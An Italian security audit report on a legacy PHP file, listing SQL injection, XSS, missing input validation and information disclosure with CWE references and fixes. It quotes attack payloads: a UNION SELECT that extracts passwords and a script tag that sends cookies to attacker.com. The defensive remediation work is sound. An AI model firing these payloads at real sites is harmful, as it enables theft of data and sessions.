# 🛡️ Report di Security Audit: `codice_legacy.php`

**Data Audit:** 10 Novembre 2026  
**Target:** `AI/codice_legacy.php`  
**Valutazione Globale di Rischio:** <span style="color:red; font-weight:bold;">CRITICO (9.8 / 10.0)</span>  

---

## 1. Executive Summary

Il file `codice_legacy.php` presenta gravi vulnerabilità di sicurezza che espongono l'applicazione e il database a compromissione totale:
1. **SQL Injection (CWE-89)**: consente l'esfiltrazione arbitraria dell'intero database o la modifica/cancellazione dei dati.
2. **Cross-Site Scripting - XSS (CWE-79)**: consente l'iniezione ed esecuzione di codice JavaScript malevolo nel browser dell'utente/amministratore (furto di sessioni, credenziali, defacement).
3. **Mancanza di Validazione dell'Input (CWE-20)**: assenza di controlli su tipo, formato e presenza del parametro `$_GET['id']`.
4. **Information Disclosure & Mancanza di Gestione Eccezioni (CWE-209)**: se il database è offline o la query fallisce, vengono esposte informazioni sull'infrastruttura.

---

## 2. Analisi Dettagliata delle Vulnerabilità

### 🔴 1. SQL Injection (In-band / Error-based / Blind)
- **ID CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) (Improper Neutralization of Special Elements used in an SQL Command)
- **OWASP Top 10:** A03:2021 – Injection
- **Severità:** **CRITICA (CVSS 9.8)**

#### Il codice vulnerabile:
```php
$idUtente = $_GET['id'];
$query = "SELECT id, nome, email, ruolo
 FROM utenti WHERE id = " . $idUtente;

$risultato = $connessione->query($query);
```

#### Descrizione del vettore di attacco:
La variabile `$idUtente` viene concatenata direttamente nella query senza alcuna sanitizzazione, cast a intero o parametrizzazione. Un aggressore può modificare l'URI per alterare la logica della query:

- **Esempio di estrazione dati non autorizzati (Tautologia):**
  ```
  codice_legacy.php?id=1 OR 1=1
  ```
  La query diventa:
  ```sql
  SELECT id, nome, email, ruolo FROM utenti WHERE id = 1 OR 1=1
  ```

- **Esempio di UNION Injection (esfiltrazione credenziali o schema del database):**
  ```
  codice_legacy.php?id=-1 UNION SELECT 1, user(), password, 4 FROM utenti-- 
  ```

#### Rimedio implementato:
Uso esclusivo di **Prepared Statements** con vincolo di parametri (`bind` / array di esecuzione) tramite PDO:
```php
$stmt = $pdo->prepare("SELECT id, nome, email, ruolo FROM utenti WHERE id = :id");
$stmt->execute(['id' => $idUtente]);
```
Con i prepared statements, il motore SQL compila la query prima di ricevere i dati: il dato non può mai essere interpretato come codice SQL.

---

### 🟠 2. Cross-Site Scripting (XSS) Diretto / Stored
- **ID CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) (Improper Neutralization of Input During Web Page Generation)
- **OWASP Top 10:** A03:2021 – Injection
- **Severità:** **ALTA (CVSS 7.5)**

#### Il codice vulnerabile:
```php
echo "<h1>Profilo: " . $utente['nome'] . "</h1>";
echo "<p>Email: " . $utente['email'] . "</p>";
```

#### Descrizione del vettore di attacco:
I valori `nome` ed `email` vengono stampati a video senza alcuna codifica dell'output HTML (*output encoding*).
Se nel database (o tramite form di registrazione) il nome contiene codice JavaScript:
```html
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
```
oppure:
```html
<img src="x" onerror="alert(document.domain)">
```
Lo script verrà eseguito nel contesto di sicurezza del browser dell'utente che visualizza la pagina, consentendo furto di sessioni, redirect fraudolenti o attacchi CSRF.

#### Rimedio implementato:
Applicazione di `htmlspecialchars()` con flag `ENT_QUOTES` e codifica `UTF-8`:
```php
echo "<h1>Profilo: " . htmlspecialchars($utente['nome'], ENT_QUOTES, 'UTF-8') . "</h1>";
```

---

### 🟡 3. Mancata Validazione e Tipizzazione dell'Input
- **ID CWE:** [CWE-20](https://cwe.mitre.org/data/definitions/20.html) (Improper Input Validation)
- **Severità:** **MEDIA (CVSS 5.3)**

#### Il codice vulnerabile:
```php
$idUtente = $_GET['id'];
```
Se il parametro `id` non viene passato nella richiesta HTTP (es. accesso a `codice_legacy.php`), PHP solleva un `Warning: Undefined array key "id"` e tenta di eseguire la query con `WHERE id = `, causando un errore di sintassi SQL.

#### Rimedio implementato:
Validazione formale tramite `filter_input`:
```php
$idUtente = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 1]
]);

if ($idUtente === false || $idUtente === null) {
    http_response_code(400);
    die("Parametro 'id' mancante o non valido.");
}
```

---

### 🟡 4. Assenza di Gestione Errori & Possibile Information Disclosure
- **ID CWE:** [CWE-209](https://cwe.mitre.org/data/definitions/209.html) / [CWE-755](https://cwe.mitre.org/data/definitions/755.html)
- **Severità:** **MEDIA (CVSS 5.0)**

#### Il codice vulnerabile:
```php
$connessione = new mysqli("localhost", "root", "", "accademiadb");
// Nessun controllo su $connessione->connect_error!
// Nessun controllo su $utente se la query non trova record!
```
In caso di fallimento di connessione o record non trovato:
1. Viene stampato l'errore del database a video (rivelando IP, username del DB o struttura delle tabelle).
2. Viene lanciato un fatal error o notice su `$utente['nome']` se `$utente` è `null` o `false`.

#### Rimedio implementato:
- Incapsulamento della connessione in blocco `try ... catch (\PDOException $e)`.
- Scrittura del dettaglio dell'errore nel registro di sistema (`error_log()`).
- Risposta pulita per l'utente con codice HTTP appropriato (`500` per errore server, `404` per utente inesistente).

---

## 3. Matrice di Rischio Riassuntiva

| Vulnerabilità | Rischio | CVSS v3.1 | Probabilità | Impatto | Stato Risoluzione |
|---|---|---|---|---|---|
| **SQL Injection** | **Critico** | **9.8** | Molto Alta | Totale (RCE/Data Loss) | ✅ Risolto (Prepared Statements) |
| **Cross-Site Scripting (XSS)** | **Alto** | **7.5** | Alta | Furto Account / Sessioni | ✅ Risolto (`htmlspecialchars`) |
| **Assenza Validazione Input** | **Medio** | **5.3** | Molto Alta | Errori applicativi | ✅ Risolto (`filter_input` INT) |
| **Information Disclosure** | **Medio** | **5.0** | Media | Leak struttura DB / Stack | ✅ Risolto (`try-catch` & HTTP codes) |

---

## 4. File Risolutivo

Il codice corretto e pronto per la produzione è disponibile nel file:
👉 **[`AI/codice_sicuro.php`](file:///f:/Informatica/xampp/htdocs/VO351-2026-001/mattia/AI/codice_sicuro.php)**

